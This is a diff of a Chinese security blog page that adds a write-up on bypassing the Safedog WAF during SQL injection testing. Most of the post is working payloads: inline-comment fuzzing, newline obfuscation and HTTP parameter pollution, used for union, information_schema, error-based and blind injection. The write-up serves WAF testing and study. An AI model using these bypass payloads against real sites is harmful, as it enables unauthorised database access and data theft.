@@ -41,12 +41,40 @@
 <meta property="og:url" content="http://mamor5409.github.io/posts/d405928/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/6.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/7.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/9.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/10.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/11.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/12.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/13.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/baocuo1.pmg">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/baocuo2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/baocuo3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/baocuo4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http6.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http7.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http_sleep.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/bool1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/bool2.png">
 <meta property="article:published_time" content="2021-05-19T08:20:43.000Z">
-<meta property="article:modified_time" content="2021-05-21T07:12:22.349Z">
+<meta property="article:modified_time" content="2021-05-21T07:16:06.494Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="SQLi">
 <meta property="article:tag" content="waf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/d405928/1.png">
 
 <link rel="canonical" href="http://mamor5409.github.io/posts/d405928/">
 
@@ -252,7 +280,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-21 15:12:22" itemprop="dateModified" datetime="2021-05-21T15:12:22+08:00">2021-05-21</time>
+                <time title="修改时间：2021-05-21 15:16:06" itemprop="dateModified" datetime="2021-05-21T15:16:06+08:00">2021-05-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -281,7 +309,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1</span>
+              <span>1.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -301,7 +329,94 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>1</p>
+        <h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="/posts/d405928/1.png"></p>
+<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="/posts/d405928/2.png"></p>
+<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="/posts/d405928/3.png"><br>无法绕过</p>
+<h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="/posts/d405928/4.png"></p>
+<p><img src="/posts/d405928/8.png"><br>可以绕过<br><br></p>
+<h5 id="继续使用and"><a href="#继续使用and" class="headerlink" title="继续使用and"></a>继续使用and</h5><p>and 0x1</p>
+<p>可以使用十六进制绕过</p>
+<br>
+##### http参数污染
+![](14.png)
+<br>
+
+<hr>
+<br>
+
+<br>
+
+<h4 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h4><h5 id="使用换行符和注释绕过"><a href="#使用换行符和注释绕过" class="headerlink" title="使用换行符和注释绕过"></a>使用换行符和注释绕过</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
+<p><img src="/posts/d405928/6.png"><br><img src="/posts/d405928/7.png"></p>
+<h5 id="使用http参数污染"><a href="#使用http参数污染" class="headerlink" title="使用http参数污染"></a>使用http参数污染</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
+<br>
+
+<hr>
+<h4 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h4><h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>尝试使用<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
+<p>fuzz跑了下10000-99999都无法绕过</p>
+<p><img src="/posts/d405928/5.png"></p>
+<br>
+
+<h5 id="换行符-注释"><a href="#换行符-注释" class="headerlink" title="换行符+注释"></a>换行符+注释</h5><p><img src="/posts/d405928/9.png"></p>
+<p>无法绕过</p>
+<br>
+
+<h5 id="内联注释-换行符"><a href="#内联注释-换行符" class="headerlink" title="内联注释+换行符"></a>内联注释+换行符</h5><p><img src="/posts/d405928/10.png"></p>
+<p><code>tom%27/**/union/*!§10440§asd*//*!%0a*/select/**/1,2,3%20--+</code></p>
+<p>fuzz一下，发现91625以后的都可以绕过</p>
+<p><img src="/posts/d405928/11.png"></p>
+<p><img src="/posts/d405928/12.png"></p>
+<h5 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
+<p><img src="http3.png"></p>
+<p><img src="http4.png"></p>
+<br>
+
+<hr>
+<h5 id="database-、user-绕过"><a href="#database-、user-绕过" class="headerlink" title="database()、user()绕过"></a>database()、user()绕过</h5><p><code>databse/*!91624*/()`` </code>user/!<em>99999</em>/()``</p>
+<br>
+
+<p>这里也可以通过内联注释 中间数字没试 随便输入了几个</p>
+<p><img src="/posts/d405928/13.png"></p>
+<br>
+
+<hr>
+<h4 id="information-schema绕过"><a href="#information-schema绕过" class="headerlink" title="information_schema绕过"></a>information_schema绕过</h4><h5 id="使用内联注释-fuzz"><a href="#使用内联注释-fuzz" class="headerlink" title="使用内联注释+fuzz"></a>使用内联注释+fuzz</h5><p>没绕过</p>
+<h5 id="利用http参数污染"><a href="#利用http参数污染" class="headerlink" title="利用http参数污染"></a>利用http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),user()%23*/</code></p>
+<p><img src="http5.png"></p>
+<br>
+
+<hr>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="内联注释-fuzz"><a href="#内联注释-fuzz" class="headerlink" title="内联注释+fuzz"></a>内联注释+fuzz</h5><p>updatexml</p>
+<p>无waf情况下</p>
+<p><img src="/posts/d405928/baocuo1.pmg"></p>
+<p>开启安全狗</p>
+<p><img src="/posts/d405928/baocuo2.png"></p>
+<p>updataxml()会被拦截，中间加内联注释可以绕过</p>
+<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
+<p><img src="/posts/d405928/baocuo3.png"></p>
+<p>但是</p>
+<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>会被拦截</p>
+<p>测试了下 <code>select from ...</code> 后面加东西就会被拦截</p>
+<p>在from 后面添加 <code>%23%0a</code>可以绕过</p>
+<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
+<p><img src="/posts/d405928/baocuo4.png"></p>
+<br>
+
+<h5 id="http参数污染-1"><a href="#http参数污染-1" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
+<p><img src="http6.png"></p>
+<p><img src="http7.png"></p>
+<br>
+
+<hr>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="http参数污染-2"><a href="#http参数污染-2" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><img src="http_sleep.png"></p>
+<p><img src="/posts/d405928/bool1.png"> </p>
+<p><img src="/posts/d405928/bool2.png"></p>
+<br>
+
+<br>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在此版本的安全狗(4.0.23.13)中，利用<strong>http参数污染</strong>都可以绕过</p>
+<p>有些也可以使用<strong>内联注释</strong>+<strong>fuzz</strong>+<strong>换行符</strong>进行绕过</p>
 
     </div>
 
@@ -432,6 +547,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#and-1-1-%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">and 1&#x3D;1 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-amp-amp-%E6%9B%BF%E6%8D%A2and"><span class="nav-number">1.1.</span> <span class="nav-text">使用&amp;&amp;替换and</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A-%EF%BC%8111440"><span class="nav-number">1.2.</span> <span class="nav-text">使用内联注释&#x2F;*！11440 *&#x2F;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%A7%E7%BB%AD%E4%BD%BF%E7%94%A8and"><span class="nav-number">1.3.</span> <span class="nav-text">继续使用and</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#order-by%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">order by绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%8D%A2%E8%A1%8C%E7%AC%A6%E5%92%8C%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">使用换行符和注释绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">2.2.</span> <span class="nav-text">使用http参数污染</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#union-select-%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">union select 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">内联注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8D%A2%E8%A1%8C%E7%AC%A6-%E6%B3%A8%E9%87%8A"><span class="nav-number">3.2.</span> <span class="nav-text">换行符+注释</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A-%E6%8D%A2%E8%A1%8C%E7%AC%A6"><span class="nav-number">3.3.</span> <span class="nav-text">内联注释+换行符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">3.4.</span> <span class="nav-text">http参数污染</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#database-%E3%80%81user-%E7%BB%95%E8%BF%87"><span class="nav-number">3.5.</span> <span class="nav-text">database()、user()绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#information-schema%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">information_schema绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A-fuzz"><span class="nav-number">4.1.</span> <span class="nav-text">使用内联注释+fuzz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">4.2.</span> <span class="nav-text">利用http参数污染</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A-fuzz"><span class="nav-number">5.1.</span> <span class="nav-text">内联注释+fuzz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93-1"><span class="nav-number">5.2.</span> <span class="nav-text">http参数污染</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">6.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93-2"><span class="nav-number">6.1.</span> <span class="nav-text">http参数污染</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -501,12 +617,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">150k</span>
+    <span title="站点总字数">152k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:17</span>
+    <span title="站点阅读时长">2:18</span>
 </div>
 
 <!--
@@ -517,7 +633,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共37.2k字</span>
+  <span class="post-count">博客全站共37.6k字</span>
 </div>
 -->
         
